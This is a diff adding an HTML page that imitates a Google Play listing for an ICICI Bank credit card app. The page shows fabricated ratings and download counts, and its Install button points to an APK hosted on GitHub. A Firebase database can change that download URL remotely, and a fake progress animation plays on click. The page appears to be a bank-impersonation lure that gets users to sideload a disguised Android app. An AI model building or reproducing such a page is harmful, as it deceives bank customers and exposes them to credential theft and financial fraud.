@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    
+    <!-- ===== PRIMARY META TAGS ===== -->
+    <title>ICICI Bank Credit Card – Apply Now | Secure Banking App</title>
+    <meta name="description" content="Download the official ICICI Bank Credit Card app. Manage your savings, fixed deposits, loans, and credit cards securely. 100M+ downloads.">
+    <meta name="keywords" content="ICICI Bank, Credit Card, Savings Account, Fixed Deposit, Online Banking, Finance App, India">
+    <link rel="canonical" href="https://icici-bank-credit-card.example.com/">
+    
+    <!-- ===== FAVICON ===== -->
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>" type="image/svg+xml">
+    <link rel="apple-touch-icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🏦</text></svg>">
+    
+    <!-- ===== OPEN GRAPH / SOCIAL SHARE (Facebook, WhatsApp, LinkedIn) ===== -->
+    <meta property="og:title" content="ICICI Bank Credit Card – Apply Now | Secure Banking App">
+    <meta property="og:description" content="Download the official ICICI Bank app. Manage credit cards, savings, fixed deposits, loans &amp; more. 4.5⭐ | 549k reviews.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://icici-bank-credit-card.example.com/">
+    <meta property="og:image" content="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/icon.jpg?raw=true">
+    <meta property="og:image:width" content="512">
+    <meta property="og:image:height" content="512">
+    <meta property="og:image:alt" content="ICICI Bank Credit Card App Logo">
+    <meta property="og:site_name" content="ICICI Bank Credit Card Services">
+    
+    <!-- ===== TWITTER CARD (optional but recommended) ===== -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="ICICI Bank Credit Card – Apply Now">
+    <meta name="twitter:description" content="Official ICICI Bank app: credit cards, savings, FD, loans. 100M+ downloads.">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/icon.jpg?raw=true">
+    
+    <!-- ===== THEME COLOR (mobile browsers) ===== -->
+    <meta name="theme-color" content="#056449">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="style.css" rel="stylesheet">
+    <style>
+        /* --- same as original --- */
+        .btn-install.loading { opacity: 0.7; pointer-events: none; }
+        .btn-install .spinner { display: none; }
+        .btn-install.loading .spinner {
+            display: inline-block;
+            width: 20px; height: 20px;
+            border: 2px solid #fff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .file-info {
+            background: #f7fafc;
+            padding: 10px 16px;
+            border-radius: 8px;
+            margin-top: 12px;
+            font-size: 13px;
+            display: none;
+        }
+        .file-info.show { display: block; }
+        .file-info .label { color: #718096; font-weight: 500; }
+        .file-info .value { color: #2d3748; margin-left: 4px; }
+        .download-progress {
+            display: none;
+            margin-top: 10px;
+            text-align: center;
+        }
+        .download-progress.show { display: block; }
+        .download-progress .bar {
+            width: 100%; height: 4px;
+            background: #e2e8f0;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        .download-progress .bar .fill {
+            height: 100%;
+            background: #056449;
+            width: 0%;
+            transition: width 0.3s;
+        }
+        .no-apk {
+            color: #e53e3e;
+            text-align: center;
+            padding: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        .version-tag {
+            background: #e6f9ed;
+            color: #056449;
+            padding: 2px 10px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 500;
+            margin-left: 8px;
+        }
+        .download-complete {
+            color: #0a8f4a;
+            font-weight: 500;
+        }
+        /* small fix for rating stars */
+        .star-icon { height: 16px; vertical-align: middle; }
+        .download-icon { display: inline-block; width: 18px; height: 18px; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%235f6368"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>') no-repeat center; background-size: contain; }
+        .img-3go { height: 20px; }
+        .tip-icon { height: 16px; vertical-align: middle; margin-left: 4px; }
+        .app-logo { width: 72px; height: 72px; border-radius: 16px; object-fit: cover; background: #e2e8f0; }
+        .banner-item img { width: 100%; height: auto; border-radius: 12px; }
+        .main-padding { padding-left: 16px; padding-right: 16px; }
+        .page-main { max-width: 480px; margin: 0 auto; background: #fff; font-family: 'Roboto', sans-serif; }
+        .top-nav { display: flex; justify-content: space-between; padding: 12px 16px; }
+        .app-info { padding-top: 8px; }
+        .info-box { display: flex; gap: 14px; align-items: center; }
+        .app-desc .name { font-size: 18px; font-weight: 500; }
+        .apfrom { display: flex; gap: 8px; font-size: 13px; color: #5f6368; }
+        .app-stat-info { margin-top: 16px; }
+        .app-stat-unit { display: flex; justify-content: space-around; }
+        .unit-item { text-align: center; }
+        .upper { display: flex; align-items: center; justify-content: center; gap: 4px; font-weight: 500; }
+        .lower { font-size: 12px; color: #5f6368; }
+        .operation { margin-top: 16px; }
+        .btn-install { display: inline-block; background: #056449; color: #fff; padding: 12px 32px; border-radius: 30px; text-decoration: none; font-weight: 500; width: 100%; text-align: center; box-sizing: border-box; }
+        .app-banner-list { display: flex; gap: 12px; overflow-x: auto; padding: 8px 16px; }
+        .banner-item { flex: 0 0 120px; }
+        .title-box { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #e8eaed; }
+        .desc-box { padding: 12px 0; font-size: 14px; color: #3c4043; line-height: 1.5; }
+        .categories-box { display: flex; gap: 8px; flex-wrap: wrap; padding-bottom: 12px; }
+        .category-tag { background: #f1f3f4; padding: 4px 12px; border-radius: 20px; font-size: 13px; }
+        .rating-details-content { display: flex; gap: 16px; padding: 12px 0; }
+        .average-score .score { font-size: 32px; font-weight: 500; }
+        .bar-graph-container { flex:1; }
+        .rating-bar { display: flex; align-items: center; gap: 6px; font-size: 13px; }
+        .bar-track { flex:1; height: 6px; background: #e8eaed; border-radius: 4px; }
+        .bar-fill { height: 100%; background: #056449; border-radius: 4px; }
+        .bottom-nav { display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #e8eaed; margin-top: 8px; }
+        .bottom-nav-item { color: #5f6368; font-weight: 500; }
+        .bottom-nav-item.active { color: #056449; }
+        .data-safety-box { margin-top: 8px; }
+        .noscrollbar::-webkit-scrollbar { display: none; }
+        .noscrollbar { -ms-overflow-style: none; scrollbar-width: none; }
+    </style>
+</head>
+<body>        
+    <div class="page-main">
+        <!-- top nav -->
+        <div class="top-nav">
+            <span class="back-arrow">←</span>
+            <span class="menu-icon">⋮</span>
+        </div>
+        
+        <!-- app info -->
+        <div class="app-info main-padding">
+            <div class="info-box">
+                <img class="app-logo" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/icon.jpg?raw=true" alt="ICICI Bank Credit Card App Logo" loading="lazy">
+                <div class="app-desc">
+                    <div class="name">ICICI Bank: CREDIT CARD</div>
+                    <div class="apfrom">
+                        <div class="apfrom-name">ICICI Bank Ltd.</div>
+                        <div class="apfrom-tip">In-app purchases</div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="app-stat-info">
+                <div class="app-stat-unit">
+                    <div class="unit-item">
+                        <div class="upper"><div>4.5</div><img class="star-icon" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/stars.png?raw=true" alt="4.5 stars"></div>
+                        <div class="lower">549k reviews</div>
+                    </div>
+                    <div class="unit-item">
+                        <div class="upper"><div class="download-icon"></div><div>100M+</div></div>
+                        <div class="lower">Downloads</div>
+                    </div>
+                    <div class="unit-item">
+                        <div class="upper"><img class="img-3go" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/18go.jpg?raw=true" alt="Rated 3+"></div>
+                        <div class="lower"><div>Rated for 3+</div><img class="tip-icon" src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/tip.jpg?raw=true" alt="info"></div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- download area -->
+            <div class="operation">
+                <a href="#" class="btn-install download-app-link" id="downloadBtn">
+                    <span class="spinner"></span>
+                    <span class="btn-text">Install</span>
+                </a>
+                <div class="file-info" id="fileInfo">
+                    <span class="label">📦 Version:</span>
+                    <span class="value" id="versionDisplay">-</span>
+                    <span class="label" style="margin-left:16px;">📊 Size:</span>
+                    <span class="value" id="sizeDisplay">-</span>
+                </div>
+                <div class="download-progress" id="downloadProgress">
+                    <div class="bar"><div class="fill" id="downloadFill"></div></div>
+                    <span style="font-size:12px;color:#718096;" id="progressText">Downloading...</span>
+                </div>
+                <div class="no-apk" id="noApk">⚠️ No APK available</div>
+            </div>
+        </div>
+        
+        <!-- banners -->
+        <div class="app-banner-box">
+            <div class="app-banner-list noscrollbar">
+                <div class="banner-item"><img src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/1.jpg?raw=true" alt="Screenshot 1"></div>
+                <div class="banner-item"><img src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/2.jpg?raw=true" alt="Screenshot 2"></div>
+                <div class="banner-item"><img src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/3.jpg?raw=true" alt="Screenshot 3"></div>
+                <div class="banner-item"><img src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/4.jpg?raw=true" alt="Screenshot 4"></div>
+                <div class="banner-item"><img src="https://raw.githubusercontent.com/netlifyw-cell/apk-storage/main/5.jpg?raw=true" alt="Screenshot 5"></div>
+            </div>
+        </div>
+        
+        <!-- about -->
+        <div class="app-desc-box main-padding">
+            <div class="title-box"><div class="title">About this app</div><div class="arrow-icon"></div></div>
+            <div class="desc-box">
+                Savings Account, Fixed Deposit (FD), Zero Balance savings account ICICI Bank Ltd. - Savings Account, Fixed Deposit, Zero Balance Savings account, Money Transfer, Investment, Loans and Credit Card, Insurance, Bharat Bill Payment System, Recharge, and more.
+            </div>
+            <div class="categories-box main-padding">
+                <span class="category-tag">Finance</span>
+                <span class="category-tag">Bank and online banking</span>
+            </div>
+        </div>
+        
+        <!-- ratings -->
+        <div class="rating-details-box main-padding">
+            <div class="title-box"><div class="title">Ratings and reviews</div><div class="arrow-icon"></div></div>
+            <div class="rating-details-content">
+                <div class="average-score"><div class="score">4.5</div><div style="font-size:0.75rem;color:#70757A;margin-top:4px;">549k reviews</div></div>
+                <div class="bar-graph-container">
+                    <div class="rating-bar"><span class="label">5</span><div class="bar-track"><div class="bar-fill" style="width:70%;"></div></div></div>
+                    <div class="rating-bar"><span class="label">4</span><div class="bar-track"><div class="bar-fill" style="width:20%;"></div></div></div>
+                    <div class="rating-bar"><span class="label">3</span><div class="bar-track"><div class="bar-fill" style="width:5%;"></div></div></div>
+                    <div class="rating-bar"><span class="label">2</span><div class="bar-track"><div class="bar-fill" style="width:3%;"></div></div></div>
+                    <div class="rating-bar"><span class="label">1</span><div class="bar-track"><div class="bar-fill" style="width:2%;"></div></div></div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- data safety -->
+        <div class="data-safety-box main-padding">
+            <div class="title-box"><div class="title">Data safety</div><div class="arrow-icon"></div></div>
+            <div class="desc-box">
+                Safety starts with understanding how developers collect and share your data. Data privacy and security practices...
+            </div>
+        </div>
+        
+        <!-- bottom nav -->
+        <div class="bottom-nav">
+            <span class="bottom-nav-item games">Games</span>
+            <span class="bottom-nav-item apps">Apps</span>
+            <span class="bottom-nav-item search active">Search</span>
+            <span class="bottom-nav-item books">Books</span>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+    <script>
+        // ============================================
+        // Firebase config (your database)
+        // ============================================
+        const firebaseConfig = {
+            databaseURL: "https://app-store-4d60b-default-rtdb.firebaseio.com"
+        };
+        
+        const DB_PATH = 'apk_data';
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        const downloadBtn = document.getElementById('downloadBtn');
+        const btnText = downloadBtn.querySelector('.btn-text');
+        const fileInfo = document.getElementById('fileInfo');
+        const versionDisplay = document.getElementById('versionDisplay');
+        const sizeDisplay = document.getElementById('sizeDisplay');
+        const downloadProgress = document.getElementById('downloadProgress');
+        const downloadFill = document.getElementById('downloadFill');
+        const progressText = document.getElementById('progressText');
+        const noApk = document.getElementById('noApk');
+
+        // hardcoded APK URL (your GitHub release)
+        const GITHUB_URL = "https://github.com/netlifyw-cell/apk-storage/releases/download/v1.0.0/ICICI.RuPay.Credit.Card.Apply.Form.apk";
+
+        function formatFileSize(bytes) {
+            if (!bytes || bytes === 0) return '-';
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+            return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+        }
+
+        function setAPK(data) {
+            noApk.style.display = 'none';
+            
+            let downloadUrl = GITHUB_URL;
+            let version = '1.0.0';
+            let fileSize = 0;
+            
+            if (data && data.downloadUrl) {
+                downloadUrl = data.downloadUrl;
+                version = data.version || '1.0.0';
+                fileSize = data.fileSize || 0;
+            }
+            
+            fileInfo.classList.add('show');
+            versionDisplay.textContent = version;
+            sizeDisplay.textContent = fileSize ? formatFileSize(fileSize) : '-';
+            
+            btnText.textContent = 'Install';
+            downloadBtn.href = downloadUrl;
+            
+            // download simulation
+            downloadBtn.onclick = function(e) {
+                e.preventDefault();
+                downloadProgress.classList.add('show');
+                downloadFill.style.width = '0%';
+                progressText.textContent = 'Starting download...';
+                
+                let progress = 0;
+                const interval = setInterval(() => {
+                    progress += Math.random() * 15;
+                    if (progress > 95) {
+                        progress = 95;
+                        clearInterval(interval);
+                        progressText.textContent = 'Almost done...';
+                    }
+                    downloadFill.style.width = progress + '%';
+                }, 300);
+                
+                setTimeout(() => {
+                    if (downloadProgress.classList.contains('show')) {
+                        downloadFill.style.width = '100%';
+                        progressText.textContent = '✅ Download complete!';
+                        setTimeout(() => {
+                            downloadProgress.classList.remove('show');
+                        }, 3000);
+                    }
+                }, 8000);
+            };
+        }
+
+        // Firebase listener
+        const dbRef = database.ref(DB_PATH);
+        dbRef.on('value', (snapshot) => {
+            const data = snapshot.val();
+            setAPK(data);
+        }, (err) => {
+            console.error('Connection error:', err);
+            setAPK(null);
+        });
+        
+        // fallback
+        setTimeout(() => {
+            dbRef.once('value', (snapshot) => {
+                if (!snapshot.val()) {
+                    setAPK(null);
+                }
+            });
+        }, 3000);
+    </script>
+</body>
+</html>
